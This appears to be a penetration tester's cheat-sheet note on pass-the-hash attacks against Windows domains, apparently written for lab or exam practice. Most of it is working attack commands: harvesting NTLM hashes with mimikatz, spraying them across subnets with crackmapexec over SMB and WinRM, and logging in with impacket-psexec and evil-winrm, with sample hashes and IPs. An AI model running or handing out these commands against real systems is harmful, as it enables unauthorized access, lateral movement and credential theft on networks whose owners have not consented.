<https://ptestmethod.readthedocs.io/en/latest/cme.html> crackmapexec

You can use enum4linux to sometimes get access to all usernames on domain. Use this list to perform password spraying

Next, we spray all the machines on the network with the NTLM hash we hopefully found:

crackmapexec smb 192.168.231.0/24 -u users.txt -H aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990

After hopefully finding more users, we can access their machines using a few methods that supports hash-logins:

Hash-login with psexec:
impacket-psexec administrator@172.31.1.29 -hashes :36242e2cb0b26d16fafd267f39ccf990 

Hash-login with evil-winrm:
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150

---

After having dumped with mimikatz. sekurlsa::logonpasswords

Copy all output from mimikatz save it as weee, then do this:

cat weee | sort | uniq | grep -i ntlm

Take those hashes into a file and call it hashes.txt

Next, to find all users, just type "net users /domain" in windows machine and copy paste all of those to clipboard.

Then come to this amazing website I found after 8 tries: <https://design215.com/toolbox/wordlist.php.> Check all the boxes, paste, click count words, then copy the new list and add them into a file too, call it users.txt

Next, make an IP list with all IPs you want to bruteforce. gedit iplist.txt
example output:
```
10.11.1.123
10.11.1.122
10.11.1.121
10.11.1.120
```

Then run this: (Do all attacks with both --local-auth and without. It will provide different insight)
crackmapexec smb iplist.txt -u users.txt -H hashes.txt | tee cme_xor_smb.txt

crackmapexec winrm iplist.txt -u users.txt -H hashes.txt | tee cme_xor_smb.txt

crackmapexec smb svcorp_ip -u uniq_user -H uniq_hash --local-auth | tee cme_svcorp_smb.txt

Find the pwned accounts quick after a full bruteforce attempt: 
cat cme_xor_smb.txt | grep -b '+'

Keep in mind smb or winrm doesn't cover impacket-psexec, so test with all. 

Also, if crackmapexec keeps dying after 3 successful hits, simply take that username and place at the bottom of list and see if finds new hits when you restart bruteforcing. 

![unnamed_a0ba9c216eda468e8615157d88ea4bd1](unnamed_a0ba9c216eda468e8615157d88ea4bd1.png)
